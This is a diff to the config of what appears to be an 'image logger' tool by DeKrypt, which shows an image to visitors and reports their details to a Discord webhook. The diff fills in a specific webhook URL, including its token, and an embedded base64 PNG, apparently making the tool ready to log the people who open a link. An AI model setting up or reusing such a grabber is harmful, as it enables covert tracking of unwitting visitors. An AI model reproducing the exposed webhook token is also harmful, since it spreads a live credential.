@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1145045117229596763/0kaKwlozKGTPxaXDBtcxWh3RaxqROMcv74q0E4y-zHw9udJHZlUnPLV_Hc-Yusjkc6rx",
+    "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAP8AAADFCAMAAACsN9QzAAAAYFBMVEX///8AAACwsLArKyvNzc2qqqpERESzs7Pk5OQsLCy4uLjV1dX19fXe3t7S0tLy8vKHh4d5eXk1NTUdHR1paWk7Ozvn5+eRkZFPT09GRkZfX18VFRWbm5uOjo4jIyNzc3Nb2KqxAAACTElEQVR4nO3dyVLCUBBG4ZvIECQhoAwyKO//llJy79ryT5u28Zx9F/0xWGwaUyIiol+o75pB803XG23i0rqqqpn+DDSz2/zacJ+R21RfqS9hfx/fmO40Ys19f/kVXOf5YR8hv+Z5/xdx/iXPz023Gq867/8kzj/l+dp0q/HCjx8/fvxa+PHjx48/Zvjx48ePXws/fvz48ccMP378+PFr4cePHz/+mOHHjx8/fi38+PHjxx8z/Pjx48evFd1f7n8W4vwiz/vf/3RTofqa93+tlfFp/Zrnr9J8Z8ffVhHbWvE33hIxo8PJ1tsh15r4V94MuZWJv/n+gf5oRoezO2+H2M6Gn/beELG9kT+1h7fZzzuW7y/VUZi+zZfxhTL/drD56zeg57K/OF+ev2fTrcbrv3//x48fP378Wvjx48ePP2b48ePHj18LP378+PHHDD9+/Pjxa+HHjx8//pjhx48fP34t/Pjx48cfM/z48ePHr4Uff2T/w9x/dacqXiezHwCIegBtc/6c0tkbIna24XfeDjmbT8DSmyG3NPEnb4acDT9dvB1iFyN/OnhLpA5W/JTa1eTnrd7zIh9LYXoyWX7k+Xfp0d3P/x/o95+0/vv3f/z48ePHr4UfP378+GOGHz9+/Pi18OPHjx9/zPDjx48fvxZ+/Pjx448Zfvz48ePXwo8fP378McOPHz9+/FrR/eX+W/0/tOX/7rrff4v1eX/1Dq/cHfamW43YZdDbv3wAzM4Yx29+E1z1Q7z2env2ol6/3Rv63g373ici+uN9ApxeKpVvdq+EAAAAAElFTkSuQmCC", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
